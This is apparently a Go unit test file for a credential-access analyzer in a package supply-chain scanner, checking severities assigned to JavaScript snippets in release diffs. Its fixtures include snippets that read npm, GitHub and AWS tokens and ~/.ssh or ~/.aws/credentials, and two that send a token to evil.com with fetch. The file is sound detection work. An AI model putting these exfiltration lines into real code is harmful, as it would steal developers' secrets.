package analyzer

import (
	"testing"

	"github.com/chainrecon/chainrecon/internal/model"
)

func TestCredentialAnalyzer(t *testing.T) {
	ca := NewCredentialAnalyzer()

	tests := []struct {
		name         string
		diff         *model.ReleaseDiff
		wantCount    int
		wantSeverity model.Severity
		wantMessage  string
	}{
		{
			name: "clean file produces no findings",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "index.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`console.log("hello");`),
				}},
			},
			wantCount: 0,
		},
		{
			name: "process.env.NPM_TOKEN access (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/auth.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`const token = process.env.NPM_TOKEN;`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
			wantMessage:  "Credential or sensitive file access detected",
		},
		{
			name: "process.env.GITHUB_TOKEN access (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/gh.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`const t = process.env.GITHUB_TOKEN;`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "process.env.AWS_ACCESS_KEY_ID access",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/aws.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`const key = process.env.AWS_ACCESS_KEY_ID;`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "generic process.env access (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/config.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`const port = process.env.PORT || 3000;`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "reference to ~/.npmrc (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/steal.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`fs.readFileSync("~/.npmrc");`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "reference to ~/.ssh (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/keys.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`fs.readdirSync("~/.ssh");`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "reference to ~/.aws/credentials (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "lib/creds.js",
					Status:     model.DiffAdded,
					NewContent: []byte(`fs.readFileSync("~/.aws/credentials");`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "credential access with network call is critical",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:   "lib/exfil.js",
					Status: model.DiffAdded,
					NewContent: []byte(`
						const token = process.env.NPM_TOKEN;
						fetch("https://evil.com/steal?t=" + token);
					`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityCritical,
			wantMessage:  "Credential access combined with network call",
		},
		{
			name: "os.homedir with .ssh reference (high)",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:   "lib/read.js",
					Status: model.DiffAdded,
					NewContent: []byte(`
						const os = require('os');
						const home = os.homedir();
						const keys = fs.readdirSync(path.join(home, '.ssh'));
					`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "non-JS file is skipped",
			diff: &model.ReleaseDiff{
				Added: []model.FileDiff{{
					Path:       "README.md",
					Status:     model.DiffAdded,
					NewContent: []byte(`Set process.env.NPM_TOKEN to authenticate.`),
				}},
			},
			wantCount: 0,
		},
		{
			name: "modified file is scanned",
			diff: &model.ReleaseDiff{
				Modified: []model.FileDiff{{
					Path:       "lib/config.js",
					Status:     model.DiffModified,
					OldContent: []byte(`module.exports = {};`),
					NewContent: []byte(`const secret = process.env.AWS_SECRET_ACCESS_KEY;`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
		},
		{
			name: "credential + network in modified file is critical",
			diff: &model.ReleaseDiff{
				Modified: []model.FileDiff{{
					Path:       "lib/util.ts",
					Status:     model.DiffModified,
					OldContent: []byte(`export function noop() {}`),
					NewContent: []byte(`const t = process.env.GITHUB_TOKEN; fetch("https://evil.com/" + t);`),
				}},
			},
			wantCount:    1,
			wantSeverity: model.SeverityCritical,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := ca.Analyze(tt.diff)

			if len(findings) != tt.wantCount {
				t.Fatalf("got %d findings, want %d: %+v", len(findings), tt.wantCount, findings)
			}

			if tt.wantCount > 0 && tt.wantSeverity != "" {
				if findings[0].Severity != tt.wantSeverity {
					t.Errorf("severity = %s, want %s", findings[0].Severity, tt.wantSeverity)
				}
			}

			if tt.wantMessage != "" && tt.wantCount > 0 {
				if findings[0].Message != tt.wantMessage {
					t.Errorf("message = %q, want %q", findings[0].Message, tt.wantMessage)
				}
			}

			for _, f := range findings {
				if f.Signal != "credential_access" {
					t.Errorf("signal = %q, want credential_access", f.Signal)
				}
			}
		})
	}
}
